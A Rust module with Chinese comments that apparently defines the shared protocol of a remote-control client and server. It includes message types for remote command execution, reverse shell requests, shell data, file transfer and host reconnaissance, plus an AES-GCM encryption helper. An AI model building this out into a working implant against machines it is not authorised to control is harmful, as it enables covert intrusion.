use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

/// 客户端与服务端之间的通信协议
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Message {
    pub id: String,
    pub timestamp: DateTime<Utc>,
    pub message_type: MessageType,
    pub payload: Vec<u8>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum MessageType {
    /// 客户端注册
    ClientRegister,
    /// 客户端心跳
    Heartbeat,
    /// 执行命令
    ExecuteCommand,
    /// 命令结果
    CommandResult,
    /// 反弹Shell请求
    ReverseShell,
    /// Shell数据
    ShellData,
    /// 文件传输
    FileTransfer,
    /// 系统信息
    SystemInfo,
    /// 错误消息
    Error,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientInfo {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub ip: String,
    pub connected_at: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandRequest {
    pub client_id: String,
    pub command: String,
    pub args: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandResponse {
    pub client_id: String,
    pub command: String,
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub executed_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellSession {
    pub client_id: String,
    pub session_id: String,
    pub created_at: DateTime<Utc>,
    pub is_active: bool,
}

impl Message {
    pub fn new(message_type: MessageType, payload: Vec<u8>) -> Self {
        Self {
            id: Uuid::new_v4().to_string(),
            timestamp: Utc::now(),
            message_type,
            payload,
        }
    }

    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string(self)
    }

    pub fn from_json(json: &str) -> Result<Self, serde_json::Error> {
        serde_json::from_str(json)
    }
}

/// 加密和解密工具
pub mod crypto {
    use aes_gcm::{
        Aes256Gcm, Key, Nonce,
        aead::{Aead, AeadCore, KeyInit, OsRng},
    };
    use base64::{Engine as _, engine::general_purpose};

    pub struct Cipher {
        cipher: Aes256Gcm,
    }

    impl Cipher {
        pub fn new(key: &[u8; 32]) -> Self {
            let key = Key::<Aes256Gcm>::from_slice(key);
            let cipher = Aes256Gcm::new(key);
            Self { cipher }
        }

        pub fn encrypt(&self, plaintext: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
            let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
            let ciphertext = self
                .cipher
                .encrypt(&nonce, plaintext)
                .map_err(|e| e.to_string())?;

            let mut result = nonce.to_vec();
            result.extend_from_slice(&ciphertext);
            Ok(general_purpose::STANDARD.encode(result))
        }

        pub fn decrypt(&self, ciphertext: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
            let data = general_purpose::STANDARD.decode(ciphertext)?;
            if data.len() < 12 {
                return Err("Invalid ciphertext length".into());
            }

            let (nonce, ciphertext) = data.split_at(12);
            let nonce = Nonce::from_slice(nonce);
            let plaintext = self
                .cipher
                .decrypt(nonce, ciphertext)
                .map_err(|e| e.to_string())?;
            Ok(plaintext)
        }
    }
}

/// 网络工具
pub mod network {
    use std::net::{IpAddr, Ipv4Addr};
    use std::process::Command;

    pub fn get_local_ip() -> Result<IpAddr, Box<dyn std::error::Error>> {
        let output = Command::new("hostname").arg("-I").output()?;

        let ip_str = String::from_utf8(output.stdout)?;
        let ip = ip_str
            .split_whitespace()
            .next()
            .unwrap_or("127.0.0.1")
            .parse::<Ipv4Addr>()?;

        Ok(IpAddr::V4(ip))
    }

    pub fn get_hostname() -> Result<String, Box<dyn std::error::Error>> {
        let output = Command::new("hostname").output()?;

        Ok(String::from_utf8(output.stdout)?.trim().to_string())
    }
}
